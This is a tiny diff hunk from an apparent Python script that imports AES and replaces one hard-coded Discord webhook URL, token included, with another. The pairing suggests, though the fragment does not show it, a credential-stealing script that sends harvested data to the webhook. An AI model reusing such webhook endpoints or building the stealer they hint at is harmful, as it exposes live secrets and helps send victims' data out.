@@ -75,7 +75,7 @@ from Crypto.Cipher import AES
 
 
 
-hook = "https://discord.com/api/webhooks/1387059184918593629/jXvS_qOp_Jf7lzXzutlnHzyDNxp8cDG9Rl8-m1l7-kDQiBs3hHdrBc0VskpOBcLyu-Fo"
+hook = "https://discord.com/api/webhooks/1387203932081881199/mmTEkTLjw58eq3Lqykmtw0NK9ApheRPTXtTfSNgzhlw5wAICErgYQCg3RNEjoKmt1qEy"
 
 
 
